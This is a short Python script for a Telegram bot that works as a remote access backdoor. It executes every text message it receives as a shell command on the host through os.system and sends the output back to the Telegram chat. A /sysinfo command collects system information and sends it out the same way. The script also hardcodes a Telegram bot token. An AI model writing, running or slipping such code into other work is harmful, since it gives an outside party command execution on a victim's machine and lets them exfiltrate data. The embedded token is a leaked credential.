import telebot
import os
import threading
import sysinfo

TOKEN="5328185109:AAH_TXuYXrVRs_-_UzDqh6D7rff4YuXKOXk"
bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['sysinfo'])
def handle_info(message):
    info=threading.Thread(target=lambda:getinfo(message),daemon=True)
    info.start()

def getinfo(message):
    sysinfo.System_information()
    with open('./info.txt','r') as file:
        info = file.read()
    bot.send_message(message.chat.id,info)
    os.remove("info.txt")

@bot.message_handler(content_types=['text'])
def handle_commands(message):
        commnd = message.text
        os.system(f"{commnd} >> cmd.txt")
        os.system("find / -name 'cmd.txt' >> find.txt")  
        with open("find.txt","r") as cmd:
                find = cmd.read().split("\n")[0]
        with open(find,"r") as cmd:
                out = cmd.read()
        bot.send_message(message.chat.id,out)
        try:
            os.remove("cmd.txt")
        except:
            os.remove("find.txt")
            os.remove(find)

bot.polling(none_stop=True, timeout=123)            
